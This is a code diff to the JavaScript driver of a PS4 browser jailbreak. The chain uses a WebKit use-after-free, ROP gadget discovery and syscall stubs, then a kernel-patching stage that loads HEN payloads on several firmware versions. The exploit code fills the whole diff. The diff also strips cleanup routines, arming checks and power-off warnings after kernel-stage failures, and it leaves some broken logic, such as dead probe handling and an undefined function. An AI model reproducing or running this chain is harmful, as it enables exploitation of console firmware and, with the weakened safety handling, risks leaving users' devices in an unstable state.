@@ -1,15 +1,18 @@
-import { establishPrimitive, releasePrimitiveState } from "./core.js?v=hen1402r17";
-import { installWindowP, pairStatus, releaseWindowP } from "./mem.js?v=hen1402r17";
-import { int64 } from "./int64.js?v=hen1402r17";
-import { offsetsFor, PS4 } from "./ps4_offsets.js?v=hen1402r17";
+import { establishPrimitive } from "./core.js";
+import { installWindowP, pairStatus } from "./mem.js";
+import { int64 } from "./int64.js";
+import { offsetsFor, PS4 } from "./ps4_offsets.js";
 
-const outEl = document.getElementById("out");
-const stateEl = document.getElementById("state");
+const outEl = document.getElementById("console");
+const scrollEl = document.getElementById("DebugConsole") || outEl;
+const stateEl = document.getElementById("state") || outEl;
+var payload_path = sessionStorage.getItem("payload_path");
+const elfldr_path = './includes/payloads/Bins/elfldr.bin';
+var isElfPayload = isPayloadElf(payload_path);
+var elfLoaderAvailable; // Needs to me validated somewhere
+
 const lines = [];
-let passCount = 0,
-  failCount = 0;
 const params = new URLSearchParams(location.search);
-let kernelStageEntered = false;
 
 /* The retry notice. Two things lead here: the chain throws, or it stalls
    without a word. The watchdog covers the second case. It cannot fire when
@@ -28,32 +31,13 @@ function showNotice(text) {
   } catch (e) {}
 }
 
-function showSuccess(text) {
-  try {
-    let box = document.getElementById("henSuccess");
-    if (!box) {
-      box = document.createElement("div");
-      box.id = "henSuccess";
-      box.style.cssText =
-        "position:fixed;top:72px;left:50%;transform:translateX(-50%);" +
-        "z-index:9999;width:80%;max-width:760px;padding:16px 18px;" +
-        "border:2px solid #35e6a5;" +
-        "background:#073c2e;color:#d9fff1;font:700 20px/1.4 Arial,sans-serif;" +
-        "border-radius:8px";
-      (document.getElementById("wrap") || document.body).appendChild(box);
-    }
-    box.textContent = text;
-    document.body.classList.remove("fail");
-  } catch (_) {}
-}
-
 function showRetry() {
   if (retryShown) return;
   retryShown = true;
-  showNotice("No progress was recorded. Do not start another attempt on this boot; fully power off the PS4 first.");
+  showNotice("exploit failed - please retry (reopen browser)");
 }
 
-const WATCHDOG_MS = 90000;
+const WATCHDOG_MS = 45000;
 const watchdog = setInterval(function () {
   if (Date.now() - lastMark > WATCHDOG_MS) {
     try { clearInterval(watchdog); } catch (e) {}
@@ -61,49 +45,59 @@ const watchdog = setInterval(function () {
   }
 }, 5000);
 
-const HANDOFF_OK = (function () {
-  if (params.get("afterglow") !== "run") return false;
-  const run = params.get("run") || "";
-  if (!/^[0-9]+-[0-9]+$/.test(run)) return false;
+/* The referrer guard. The console's browser restores the page it had open
+   last. If that was the armed chain it would run again with nobody in front
+   of the screen, so arming requires a step from this folder's landing page.
+   The guard lives here rather than in the server, so it holds however the
+   files are served. */
+const FROM_LANDING = (function () {
   try {
-    const good = sessionStorage.getItem("hen-1402-core-tab-token") === run &&
-      localStorage.getItem("hen-1402-core-attempted") === run + ":started";
-    sessionStorage.removeItem("hen-1402-core-tab-token");
-    if (good) localStorage.setItem("hen-1402-core-attempted", run + ":armed");
-    return good;
-  } catch (_) { return false; }
+    if (!document.referrer) return false;
+    const r = new URL(document.referrer);
+    if (r.origin !== location.origin) return false;
+    const cameFrom = r.pathname.replace(/[^/]*$/, "");
+    const here = location.pathname.replace(/[^/]*$/, "");
+    if (cameFrom !== here) return false;
+    const file = r.pathname.slice(cameFrom.length);
+    return file === "" || file === "index.html";
+  } catch (e) {
+    return false;
+  }
 })();
 
 /* A page the browser restored must do nothing at all. Until this sat here,
    the refusal came only after the WebKit stage had already run in full --
    harmless to the kernel, but pointless work on a page nobody asked to run.
-   Send it back to the start page instead, where another explicit button
-   press creates a fresh same-tab token. */
+   Send it back to the start page instead; from there the ordinary route
+   takes over, autostart included, and it arms with a proper referrer and a
+   visible countdown. A probe is exempt: it fires nothing and patches
+   nothing. */
 const SENT_HOME = (function () {
-  const want = params.get("afterglow");
-  if (!want || HANDOFF_OK) return false;
+  const want = true;
+  if (!want || want === "probe" || FROM_LANDING) return false;
   try {
     /* Pin the page to the .fail look: the message lives in #msg, which is
        hidden in log mode, and the URL decides whether log mode is on. */
-    document.body.className = "fail";
-    const msgEl = document.getElementById("msg");
+    document.body.classList.add("fail");
+    const msgEl = document.getElementById("state");
     if (msgEl) {
       msgEl.textContent =
-        "Open the start page to arm one clean-boot core HEN attempt.";
+        "Restored by the browser. Nothing has been run -- " +
+        "going back to the start page.";
     }
   } catch (e) {}
   /* replace(), not assign(): the refused page must not stay in the history,
      or stepping back lands straight on it again. */
   setTimeout(function () {
     try {
+      sessionStorage.setItem('jailbreakNow', true);
       location.replace("index.html");
     } catch (e) {}
-  }, 1500);
+  }, 500);
   return true;
 })();
 
 const PROBE_MODE = params.get("probe") === "1";
-const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";
 
 const VERBOSE = params.get("verbose") === "1";
 const PROSE = [
@@ -127,9 +121,8 @@ function terse(s) {
   return s;
 }
 
-const SHOW_LOG = params.get("log") === "1";
+const SHOW_LOG = true;
 
-/* UPDATE_RAM_BOX */
 const ramBox =
   document.getElementById("ramBox");
 
@@ -232,17 +225,21 @@ if (ramBox) {
 
 /* Not when the page is on its way home: log mode hides #msg, which is
    where that notice sits. */
-if (SHOW_LOG && !SENT_HOME && document.body) document.body.className = "log";
-function finishUI(ok) {
+if (SHOW_LOG && !SENT_HOME && document.body) document.body.classList.add("log");
+/* `ran` says whether the kernel stage was entered. A failure before that
+   costs nothing and a reload is enough; a failure after it may leave the
+   handles armed, and then only a cold start is safe. */
+function finishUI(ok, ran) {
   if (SHOW_LOG || !document.body) return;
-  const m = document.getElementById("msg");
+  const m = document.getElementById("state");
   if (m)
     m.textContent = ok
       ? "DONE"
-      : kernelStageEntered
+      : ran
         ? "Restart your console"
         : "Refresh the page and run again";
-  document.body.className = ok ? "done" : "fail";
+  document.body.classList.add(ok ? "done" : "fail");
+  if (ok) window.jailbreakSuccess();
 }
 function mark(tag, detail) {
   lastMark = Date.now();
@@ -258,15 +255,6 @@ function mark(tag, detail) {
     ),
   );
 
-  if (HANDOFF_OK && tag !== "AG" && /^[A-Za-z0-9_-]{1,40}$/.test(tag)) {
-    try {
-      const url = "beacon?run=" + encodeURIComponent(params.get("run")) +
-        "&tag=" + encodeURIComponent(tag) +
-        "&detail=" + encodeURIComponent(String(raw == null ? "" : raw).slice(0, 500));
-      fetch(url, { cache: "no-store" }).catch(function () {});
-    } catch (_) {}
-  }
-
   if (lines.length > 600) {
     lines.splice(
       0,
@@ -278,8 +266,8 @@ function mark(tag, detail) {
     outEl.textContent =
       lines.join("\n");
 
-    outEl.scrollTop =
-      outEl.scrollHeight;
+    scrollEl.scrollTop =
+      scrollEl.scrollHeight;
   }
 
 }
@@ -290,14 +278,12 @@ function trace(tag, detail) {
 function state(t, c) {
   if (!SHOW_LOG || !stateEl) return;
   stateEl.textContent = t;
-  stateEl.className = c || "";
+  stateEl.classList.add(c || "");
 }
 function check(name, ok, detail) {
   if (ok) {
-    passCount++;
     mark("PROOF-OK", name + (detail ? "  " + detail : ""));
   } else {
-    failCount++;
     mark("PROOF-FAIL", name + (detail ? "  " + detail : ""));
   }
   return ok;
@@ -335,80 +321,15 @@ let mainMf = null,
   mainOrig = null,
   mainArmed = false;
 
-function releaseWebKitHeap(p) {
-  let pivotRestored = !mainArmed;
-  try {
-    if (mainArmed && mainMf && mainOrig && p) {
-      p.write8(mainMf, mainOrig);
-      const restored = p.read8(mainMf);
-      if (!restored ||
-          (restored.low >>> 0) !== (mainOrig.low >>> 0) ||
-          (restored.hi >>> 0) !== (mainOrig.hi >>> 0)) {
-        return { pivotRestored: false, coreReleased: false };
-      }
-      mainArmed = false;
-      pivotRestored = true;
-    }
-  } catch (_) {
-    return { pivotRestored: false, coreReleased: false };
-  }
-
-  if (!pivotRestored)
-    return { pivotRestored: false, coreReleased: false };
-
-  let coreReleased = false;
-  try {
-    releasePrimitiveState();
-    coreReleased = true;
-  } catch (_) {
-    return { pivotRestored: true, coreReleased: false };
-  }
-  try { releaseWindowP(); } catch (_) {}
-  try { keepAlive.length = 0; } catch (_) {}
-  mainMf = null;
-  mainOrig = null;
-  try {
-    if (typeof globalThis.gc === "function") globalThis.gc();
-  } catch (_) {}
-  return { pivotRestored: pivotRestored, coreReleased: coreReleased };
-}
-
-let jbRestoreHook = null;
-let allDone = false,
-  jailbroken = false,
-  kpatched = false,
-  payloadRunning = false;
 
 (async function () {
   if (SENT_HOME) return;
   let p = null;
 
-  function releaseBeforeKernel(reason) {
-    let released = null;
-    try { released = releaseWebKitHeap(p); } catch (_) {}
-    const ok = !!released && released.pivotRestored === true &&
-      released.coreReleased === true;
-    mark(ok ? "WEBKIT-HEAP-RELEASED" : "WEBKIT-HEAP-RELEASE-FAILED",
-      "pre-kernel=true reason=" + reason +
-      " pivot=" + (!!released && released.pivotRestored === true) +
-      " core=" + (!!released && released.coreReleased === true));
-    if (ok) p = null;
-    return ok;
-  }
-
-  const opened = [];
-  let closeFd = null;
   try {
     const { key, off } = offsetsFor(navigator.userAgent);
-    if (params.get("afterglow") === "run" && key !== "14.02") {
-      mark("FW-BLOCK", "corrected HEN route requires firmware 14.02");
-      finishUI(false);
-      return;
-    }
-    mark("BUILD", "jb=skipjb2 base=ef1670a");
     mark("FW", key || "(not a PS4 UA)");
     if (!off) {
-      /* NONPS4-DEBUG */
       try {
         document.body.classList.add("log");
       } catch (e) {}
@@ -467,10 +388,25 @@ let allDone = false,
         mark("NONPS4-CORE", "error=" + String(e));
       }
 
-      allDone = true;
       return;
     }
     const fwKey = key || "unknown";
+
+    /* afterglow carries one kernel stage per firmware, and nothing below
+       re-checks the key. On a firmware it has no stage for, the chain would
+       come up in WebKit and then write foreign addresses into the kernel --
+       so it is refused here, before anything is touched. */
+    const SUPPORTED = ["14.02", "14.00", "13.52"];
+    if (SUPPORTED.indexOf(fwKey) < 0) {
+      mark("FW-UNSUPPORTED", fwKey + " -- this build has a kernel stage for "
+           + SUPPORTED.join(", ") + " only");
+      state("firmware " + fwKey + " is not supported", "fail");
+      showNotice(
+        "This build has a kernel stage for firmware " + SUPPORTED.join(", ") +
+        " only. Detected " + fwKey + " - nothing was run.",
+      );
+      return;
+    }
 
     // How many tries the WebKit stage gets. An attempt costs nothing in the
     // kernel -- this stage is a userland UAF in JavaScript, and a miss is
@@ -506,7 +442,6 @@ let allDone = false,
       installWindowP(carrier, { promote: false });
 
       const pp = window.p;
-      p = pp;
 
       const cell = pp.leakval(Math.expm1);
 
@@ -553,24 +488,17 @@ let allDone = false,
         primitiveOk ? "PASS" : "FAIL",
       );
 
-      const primitiveReleased = releaseBeforeKernel("primitive-only complete");
-
-      allDone = true;
-      finishUI(primitiveOk && primitiveReleased);
+      finishUI(primitiveOk);
       return;
     }
 
 
-    const DO_JB = params.get("jb") !== "0";
     const DO_PATCH = params.get("patch") !== "0";
     const DO_PAYLOAD = params.get("payload") !== "0";
-    const SKIPJB = params.get("skipjb") !== "0";
-
-    const KEEP_JB = params.get("keepjb") === "1";
 
     // afterglow brings its own kernel stage, so this run does not need the
     // host's kernel table at all.
-    const OWN_KERNEL_STAGE = !!params.get("afterglow");
+    const OWN_KERNEL_STAGE = true;
     const NEED_K = OWN_KERNEL_STAGE ? [] : [
       "k_idt_rsvd",
       "k_oid_kern_file",
@@ -599,14 +527,15 @@ let allDone = false,
     )
       return;
 
-    // The 14.02 Afterglow route applies its verified embedded patch windows
-    // and loads exactly the pinned core-HEN binary.
+    // With its own kernel stage, afterglow carries its own patch set -- one
+    // per firmware, patchset-1400.bin and patchset-1352.bin -- and picks the
+    // payload from ?mode. The host's names for these never applied here.
     const KPATCH_FILE = OWN_KERNEL_STAGE
-      ? "embedded Afterglow 14.02 patch windows"
-      : "patches/" + (off.kpatch || fwKey.replace(".", "") + ".bin");
+      ? "patchset-<fw>.bin (afterglow)"
+      : "./src/kpatches/" + (off.kpatch || fwKey.replace(".", "") + ".bin");
     const PAYLOAD_FILE = OWN_KERNEL_STAGE
-      ? "hen-1402-core.bin"
-      : off.payload || "payload.bin";
+      ? "hen.bin|goldhen.bin (per ?mode)"
+      : payload_path;
     const needPatch = OWN_KERNEL_STAGE ? [] : ["k_sysent_661", "k_jmp_rsi"].filter(
       (k) => off[k] === undefined,
     );
@@ -661,6 +590,7 @@ let allDone = false,
       " src=ps4_offsets.js",
     );
 
+
     state("running the primitive...", "warn");
     await new Promise((r) => setTimeout(r, 0));
 
@@ -681,8 +611,7 @@ let allDone = false,
       "state=" +
         pairStatus.state +
         " promoted=" +
-        pairStatus.promoted +
-        "   (promotion off: the 137 MB stays pinned)",
+        pairStatus.promoted,
     );
     mark("PRIMITIVE-OK", "");
 
@@ -722,10 +651,8 @@ let allDone = false,
         aligned(webkitBase) && aligned(libkernelBase),
         "",
       )
-    ) {
-      releaseBeforeKernel("module base validation failed");
+    )
       return;
-    }
 
     const G = {};
     const GAD = [
@@ -775,10 +702,8 @@ let allDone = false,
         gated === GAD.length,
         gated + "/" + GAD.length,
       )
-    ) {
-      releaseBeforeKernel("gadget validation failed");
+    )
       return;
-    }
     const argGadget = [
       G.POP_RDI_RET,
       G.POP_RSI_RET,
@@ -819,10 +744,8 @@ let allDone = false,
     }
     mark("STUBS", "seeded=" + seeded + " scanned=" + scanned);
     const miss = Object.keys(SYS).filter((k) => !stubAddr.has(SYS[k]));
-    if (!check("syscall-page-needs-stub", miss.length === 0, miss.join(","))) {
-      releaseBeforeKernel("syscall stub validation failed");
+    if (!check("syscall-page-needs-stub", miss.length === 0, miss.join(",")))
       return;
-    }
 
     function bufAddr(ab) {
       const c = p.leakval(ab);
@@ -963,156 +886,62 @@ let allDone = false,
       };
     }
     const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
-    closeFd = (fd) => sc(SYS.close, fd).i32;
     function errno() {
       const r = callAddr(errorFn, []);
       const a = new int64(r.lo, r.hi);
       return a.hi === 0 && a.low === 0 ? -1 : p.read4(a) | 0;
     }
-    if (params.get("afterglow")) {
-      let cleanupSafe = false;
-      let terminalReleaseAttempted = false;
-      let terminalReleaseResult = null;
-      let henInstalled = false;
-      /* Arming requires the exact same-tab token created by the landing-page
-         button; restored or hand-edited launch URLs do not enter this block. */
+
+    if (payload_path) {
+      /* Arming requires a step from the landing page. A probe
+         (afterglow=probe) fires no trigger and patches nothing, so a restored
+         page may run that. */
+      let agOk = false, agRan = false;
       try {
-        const ag = await import("./afterglow-g.js?v=hen1402r17");
+        const ag = await import("./afterglow.js");
         // Exactly what afterglow reaches for, counted rather than guessed.
         const agCtx = {
           p: p, callAddr: callAddr, bufAddr: bufAddr, errno: errno,
           params: params, keepAlive: keepAlive, mark: mark, state: state,
-          firmware: fwKey,
           libkernelBase: libkernelBase, webkitBase: webkitBase,
-          stubAddr: stubAddr, off: off,
+          stubAddr: stubAddr, off: off, fw: fwKey,
           prepareMany: prepareMany, runPrepared: runPrepared,
-          markKernelStageEntered: function () {
-            kernelStageEntered = true;
-          },
-          releaseAfterPayloadStart: function (status) {
-            if (terminalReleaseAttempted) return terminalReleaseResult;
-            if (!status || status.payload !== true || status.defused !== true)
-              return { pivotRestored: false, coreReleased: false };
-            payloadRunning = true;
-            if (status.installed === true) henInstalled = true;
-            terminalReleaseAttempted = true;
-            try {
-              terminalReleaseResult = releaseWebKitHeap(p);
-            } catch (_) {
-              terminalReleaseResult = { pivotRestored: false, coreReleased: false };
-            }
-            if (!terminalReleaseResult ||
-                !terminalReleaseResult.pivotRestored ||
-                !terminalReleaseResult.coreReleased) {
-              const pivotOk = !!terminalReleaseResult &&
-                terminalReleaseResult.pivotRestored === true;
-              const coreOk = !!terminalReleaseResult &&
-                terminalReleaseResult.coreReleased === true;
-              mark("WEBKIT-HEAP-RELEASE-FAILED",
-                "early=true pivot=" + pivotOk + " core=" + coreOk);
-              try { clearInterval(watchdog); } catch (_) {}
-              showNotice("Cleanup did not finish. Keep the browser open, fully power off the PS4, and do not retry on this boot.");
-              return terminalReleaseResult;
-            }
-            p = null;
-            mark("WEBKIT-HEAP-RELEASED",
-              "early=true pivot=true core=true rc=" + status.rc +
-              " handle=" + status.handle);
-            try { clearInterval(watchdog); } catch (_) {}
-            return terminalReleaseResult;
-          },
         };
-        {
-          const result = await ag.runAfterglow(agCtx);
-          if (!kernelStageEntered) {
-            const released = releaseBeforeKernel("Afterglow preflight stopped");
-            const installedBeforeShot = !!result && result.installed === true;
-            const unknownBeforeShot = !!result && result.unknown === true;
-            allDone = true;
-            try { clearInterval(watchdog); } catch (_) {}
-            if (installedBeforeShot && released) {
-              showSuccess("Core HEN completion marker was already present. No kernel shot or second installer ran.");
-            } else if (installedBeforeShot) {
-              showNotice("The core HEN completion marker is present, but browser cleanup was not verified. Fully power off before another attempt.");
-            } else if (unknownBeforeShot) {
-              showNotice("No new kernel shot ran, but the existing kernel state is unknown. Fully power off the PS4 before another attempt.");
-            } else if (released) {
-              showNotice("The preflight stopped before any kernel shot and released its browser memory. Reopen the start page to try again.");
-            } else {
-              showNotice("The preflight stopped before any kernel shot, but browser cleanup was not verified. Fully power off before another attempt.");
-            }
-            finishUI(installedBeforeShot && released);
-            return;
-          }
-          const threadStarted = !!result &&
-            (result.threadStarted === true || result.payload === true);
-          henInstalled = !!result && result.installed === true;
-          mark("DEBUG-THREAD", henInstalled
-            ? "HEN completion marker confirmed"
-            : threadStarted
-              ? "pthread_create returned success; HEN status unconfirmed"
-              : "corrected HEN thread did not start");
-          payloadRunning = threadStarted;
-          cleanupSafe = henInstalled && result.defused === true;
-          if (henInstalled)
-            showSuccess("Core HEN installer returned success. No second installer thread was started.");
+        if (params.get("afterglow") === "probe") {
+          const probed = ag.probeAfterglow(agCtx);
+          agOk = !!(probed && probed.ok);
+        } else {
+          /* set before the call, not after: a throw inside the chain can
+             still have fired a shot, and that is the case `ran` is for */
+          agRan = true;
+          agOk = !!(await ag.runAfterglow(agCtx));
         }
       } catch (agError) {
         mark("AG-FAIL", agError && agError.message ? agError.message : String(agError));
-        if (!kernelStageEntered) throw agError;
       }
-      allDone = true;
-      mark("SHOT-END", henInstalled
-        ? "core HEN installer returned zero and wrote its completion marker"
-        : payloadRunning
-          ? "pthread_create returned; installer status unconfirmed -- no retry on this boot"
-          : "No payload thread confirmed; no automatic retry after kernel-stage entry");
-      if (cleanupSafe) {
-        const released = terminalReleaseAttempted
-          ? terminalReleaseResult
-          : releaseWebKitHeap(p);
-        if (!released || !released.pivotRestored || !released.coreReleased) {
-          const pivotOk = !!released && released.pivotRestored === true;
-          const coreOk = !!released && released.coreReleased === true;
-          mark("WEBKIT-HEAP-RELEASE-FAILED",
-            "pivot=" + pivotOk + " core=" + coreOk);
-          try { clearInterval(watchdog); } catch (_) {}
-          showNotice("Cleanup did not finish. Keep the browser open, fully power off the PS4, and do not retry on this boot.");
-          finishUI(true);
-          return;
-        }
-        p = null;
-        if (!terminalReleaseAttempted)
-          mark("WEBKIT-HEAP-RELEASED",
-            "early=false pivot=" + released.pivotRestored + " core=" + released.coreReleased);
-        try { clearInterval(watchdog); } catch (_) {}
-        finishUI(true);
-        return;
-      }
-      finishUI(henInstalled);
-      try { clearInterval(watchdog); } catch (_) {}
-      if (!henInstalled)
-        showNotice("The core HEN installer was not confirmed. Fully power off the PS4 before another attempt.");
+      finishUI(agOk, agRan);
+      // Swap the address out. The browser restores the last one after a
+      // reload, and an enabler that restarts SceShellUI causes exactly that
+      // reload -- so the last address must not be the one that runs the
+      // exploit again. Relative, so it lands on this folder's landing page
+      // however the files are served -- under a host's subdirectory just as
+      // well as at a root.
+      try {
+        history.replaceState(null, "", "index.html");
+      } catch (e) {}
+      // Stop here. Without this the host's own chain would still run
+      // afterwards -- afterglow IS the kernel stage, not a prelude to one.
       return;
     }
     mark("JB-END", "afterglow is the kernel stage -- without afterglow= nothing runs here");
-    allDone = true;
     try { if (mainArmed && mainMf && mainOrig && p) { p.write8(mainMf, mainOrig); mainArmed = false; } } catch (e) {}
     try { finishUI(false); } catch (e) {}
   } catch (eOuter) {
     try { mark("JB-THREW", (eOuter && eOuter.message) || String(eOuter)); } catch (e) {}
     try { clearInterval(watchdog); } catch (e) {}
-    if (!kernelStageEntered) {
-      let released = null;
-      try { released = releaseWebKitHeap(p); } catch (_) {}
-      if (released && released.pivotRestored && released.coreReleased) {
-        p = null;
-        showNotice("The browser stage stopped and its memory was released. Reopen the start page to try again.");
-      } else {
-        showNotice("Browser cleanup could not be verified. Fully power off the PS4 before another attempt.");
-      }
-    } else {
-      showNotice("The attempt stopped after the kernel stage began. Fully power off the PS4 before another attempt.");
-    }
+    // Put it on the television. A failure in the WebKit stage touched
+    // NOTHING -- no apm unit spent, no kernel byte written. Reopening the
+    // browser is enough; rebooting the console would waste a cycle.
+    showRetry();
   }
 })();
